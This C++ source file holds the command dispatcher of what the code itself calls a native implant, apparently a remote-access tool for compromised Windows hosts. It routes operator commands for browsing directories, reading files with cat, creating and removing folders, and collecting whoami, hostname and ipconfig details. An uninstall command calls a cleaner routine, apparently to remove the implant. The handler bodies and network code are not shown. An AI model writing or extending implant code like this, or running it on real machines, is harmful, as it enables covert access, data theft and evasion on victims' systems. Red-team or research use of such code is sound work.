#include "commands.h"
#include "commands_internal.h"
#include "cleaner.h"
#include <string>

namespace {

std::string uninstall_handler(const std::string&) {
	return cmd_uninstall();
}

struct Command {
	const char* name;
	std::string (*handler)(const std::string&);
};

// Une ligne par commande : ajouter une capacite ne touche pas au dispatch.
const Command Commands[] = {
	{"pwd",       cmd::pwd},
	{"cd",        cmd::cd},
	{"dir",       cmd::dir},
	{"ls",        cmd::dir},
	{"cat",       cmd::cat},
	{"type",      cmd::cat},
	{"mkdir",     cmd::mkdir},
	{"rmdir",     cmd::rmdir},
	{"whoami",    cmd::whoami},
	{"hostname",  cmd::hostname},
	{"ipconfig",  cmd::ipconfig},
	{"uninstall", uninstall_handler},
};

}  // namespace

std::string execute_command(const std::string& command) {
	const std::string line = cmd::trim(command);
	if (line.empty()) {
		return "";
	}

	const size_t separator = line.find_first_of(" \t");
	const std::string name = line.substr(0, separator);
	const std::string args = separator == std::string::npos
		? ""
		: cmd::trim(line.substr(separator + 1));

	for (const Command& entry : Commands) {
		if (name == entry.name) {
			return entry.handler(args);
		}
	}
	return "Commande non supportee par l'implant natif : " + name;
}
